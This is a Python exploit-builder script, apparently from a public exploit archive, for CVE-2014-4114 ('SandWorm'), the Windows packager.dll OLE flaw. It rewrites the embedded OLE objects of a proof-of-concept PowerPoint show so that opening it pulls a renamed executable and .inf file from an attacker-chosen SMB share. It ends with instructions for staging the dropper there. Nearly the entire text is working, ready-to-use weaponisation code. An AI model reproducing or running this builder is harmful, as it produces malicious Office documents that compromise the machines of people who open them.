import os
import zipfile
import sys
 
&#039;&#039;&#039;
 
Very quick and ugly [SandWorm CVE-2014-4114] exploit builder
Exploit Title: CVE-2014-4114 SandWorm builder
Built to run on: Linux/MacOSX
Date: 17/10/2014
Exploit Author: Vlad Ovtchinikov (@v1ad_o)
Vendor Homepage: microsoft.com
Tested on: Win7Sp1 64 bit  - Microsoft Offcie 2013 Plus
Demo: http://youtu.be/ljjEkhflpvM
CVE : CVE-2014-4114
NOTE:
expl.inf (md5 8313034e9ab391df83f6a4f242ec5f8d) + expl.zip (md5 4a39121a60cc79d211fc7f7cfe00b707)
should be located in the same  dir as the builder.
01:39 cve-2014-4114.py
19:35 expl.inf
15:37 expl.zip
 
e.g.  python cve-2014-4114.py 10.0.0.233 rdb xxx.exe
10.0.0.233 - ip
rdb - share
xxx.exe - dropper
&#039;&#039;&#039;
host=sys.argv[1]
share=sys.argv[2]
mal_file=sys.argv[3]
 
print "\nPoC exploit builder v0.1 for logical OLE flaw in packager.dll [CVE-2014-4114] by vlad@sensepost.com @v1ad_o\n"
print "Building ... \n "
 
# extract the original .ppsx PoC
mal_file= mal_file.replace(&#039; &#039;, &#039;&#039;)[:-4].lower()
fh = open(&#039;expl.zip&#039;, &#039;rb&#039;)
z = zipfile.ZipFile(fh)
for name in z.namelist():
    outpath = "./tmp"
    z.extract(name, outpath)
fh.close()
 
os.mkdir(&#039;out&#039;)
os.chdir(&#039;tmp&#039;)
 
# oleObject1.bin mod for GIF
infile = open(&#039;ppt/embeddings/oleObject1.bin&#039;)
outfile = open(&#039;ppt/embeddings/1.bin&#039;,&#039;w&#039;)
replacements = {&#039;10.0.0.34&#039;:host,&#039;public&#039;:share,&#039;slide1.gif&#039;:mal_file+&#039;.gif&#039;}
for line in infile:
    for src, target in replacements.iteritems():
        line = line.replace(src, target)
    outfile.write(line)
infile.close()
outfile.close()
os.remove (&#039;ppt/embeddings/oleObject1.bin&#039;)
os.rename (&#039;ppt/embeddings/1.bin&#039;,&#039;ppt/embeddings/oleObject1.bin&#039;)
 
# oleObject2.bin mod for INF
infile = open(&#039;ppt/embeddings/oleObject2.bin&#039;)
outfile = open(&#039;ppt/embeddings/2.bin&#039;,&#039;w&#039;)
replacements = {&#039;10.0.0.34&#039;:host,&#039;public&#039;:share,&#039;slide1.inf&#039;:mal_file+&#039;.inf&#039;}
for line in infile:
    for src, target in replacements.iteritems():
        line = line.replace(src, target)
    outfile.write(line)
infile.close()
outfile.close()
 
os.remove (&#039;ppt/embeddings/oleObject2.bin&#039;)
os.rename (&#039;ppt/embeddings/2.bin&#039;,&#039;ppt/embeddings/oleObject2.bin&#039;)
os.system("zip -q  -9 -r  ../out/exploit.ppsx * ")
os.chdir(&#039;..&#039;)
 
infile = open(&#039;expl.inf&#039;)
outfile = open(&#039;out/&#039;+mal_file+&#039;.inf&#039;,&#039;w&#039;)
replacements = {&#039;slide1&#039;:mal_file}
for line in infile:
    for src, target in replacements.iteritems():
        line = line.replace(src, target)
    outfile.write(line)
infile.close()
outfile.close()
os.system("rm -rf tmp")
 
print &#039;Copy the .inf .gif (renamed file.exe=>file.gif) to:\n&#039;
print &#039;*\\\\&#039;+host +&#039;\\&#039;+ share +&#039;\\&#039;+ mal_file+&#039;.gif\n&#039;
print &#039;*\\\\&#039;+host +&#039;\\&#039;+ share +&#039;\\&#039;+ mal_file+&#039;.inf\n&#039;
print &#039;Done - collect your files from the [out] folder.\n&#039;

